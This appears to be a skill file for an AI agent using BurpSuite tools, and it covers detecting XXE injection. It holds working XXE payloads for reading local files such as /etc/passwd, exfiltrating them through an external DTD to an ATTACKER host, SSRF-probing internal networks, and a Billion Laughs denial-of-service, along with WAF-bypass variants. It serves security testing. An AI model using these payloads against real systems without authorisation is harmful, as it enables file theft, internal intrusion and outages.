# XXE (XML External Entity) Injection Detection Skill

## Objective
Identify XML External Entity (XXE) vulnerabilities in applications that parse XML input.

## Instructions

### 1. Identify XML Input Vectors
Look for endpoints that accept XML:
- SOAP web services
- REST APIs with XML content
- File uploads (DOCX, XLSX, SVG, PDF)
- Configuration endpoints
- RSS/Atom feeds
- SAML authentication
- Content-Type: application/xml or text/xml

### 2. Basic XXE Detection

**Classic XXE (file read):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Windows file read:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

**Error-based XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % def "<!ENTITY &#x25; send SYSTEM 'file:///invalid/%xxe;'>">
  %def;
  %send;
]>
<root>test</root>
```

### 3. Blind XXE Detection
Use `collaborator_generate` for OOB detection:

**OOB via HTTP:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR/xxe">
]>
<root>&xxe;</root>
```

**OOB via DNS:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.COLLABORATOR">
]>
<root>&xxe;</root>
```

**OOB data exfiltration:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

External DTD (evil.dtd):
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER/?data=%file;'>">
%all;
```

### 4. Parameter Entity XXE
When regular entities are blocked:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe">
  %xxe;
]>
<root>test</root>
```

### 5. XXE in File Formats

**SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX/XLSX (in [Content_Types].xml or other XML files):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR">
]>
<Types xmlns="...">
  <Default Extension="rels" ContentType="&xxe;"/>
</Types>
```

**XInclude (when you can't control DOCTYPE):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 6. XXE to SSRF
Use XXE to scan internal network:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<root>&xxe;</root>
```

### 7. Denial of Service (Billion Laughs)
For detection purposes only - do not use aggressively:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

### 8. Bypass Techniques

**CDATA exfiltration:**
```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY content '%start;%file;%end;'>">
%all;
```

**PHP filter bypass:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

**UTF-16 encoding:**
Convert payload to UTF-16 to bypass WAF.

### 9. Confirm and Document
Use `collaborator_poll` to verify OOB interactions.

If confirmed, create finding with:
- Vulnerable endpoint
- XML parser behavior
- Proof of concept payload
- Evidence (file content, DNS/HTTP callback)
- Impact (file read, SSRF, DoS)

## MCP Tools to Use

### BurpSuite
- `http1_request`: Send XML payloads
- `collaborator_generate` / `collaborator_poll`: OOB detection
- `repeater_tab_with_payload`: Manual testing
- `base64_decode`: Decode exfiltrated data

## Keywords
xml external entity, xml injection

## References
- PayloadsAllTheThings/XXE Injection
- OWASP XXE Prevention Cheat Sheet
